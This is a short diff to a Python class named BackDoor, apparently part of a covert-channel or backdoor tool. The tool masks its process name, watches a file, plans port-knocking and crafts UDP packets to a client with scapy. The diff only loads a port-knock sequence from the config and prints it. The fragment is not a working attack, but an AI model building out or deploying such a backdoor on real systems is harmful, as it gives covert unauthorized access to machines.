@@ -142,6 +142,7 @@ class BackDoor:
         self.watch_file = ""
         self.path = ""
         self.watch_status = False
+        self.sequence = []
 
 
     def start(self):
@@ -198,6 +199,7 @@ class BackDoor:
         self.watch_dir, self.watch_file = self.watch_settings(config['covert']['watch'])
         self.path = config['covert']['watch']
         self.client = config['covert']['client']
+        self.sequence = config['share']['sequence']
         print(f"Masked as {self.masked_name}")
         print(f"log to {self.log}")
         print(f"device is {self.device}")
@@ -207,6 +209,7 @@ class BackDoor:
         print(f"file  is {self.watch_file}")
         print(f"dir  is {self.watch_dir}")
         print(f"client default is {self.client}")
+        print(f"seqwuence  is {self.sequence}")
 
     def watch_settings(self, path) -> tuple[str,str]:
         file = path.split("/")[-1]
@@ -224,7 +227,8 @@ class BackDoor:
         self.port_knock()
 
     def port_knock(self):
-        pass
+        for i in self.sequence:
+            print(i)
     def craft_packet(self, msg: str):
         ip = IP(dst=self.client)
         udp = UDP(sport=RandShort(), dport=self.send_port)
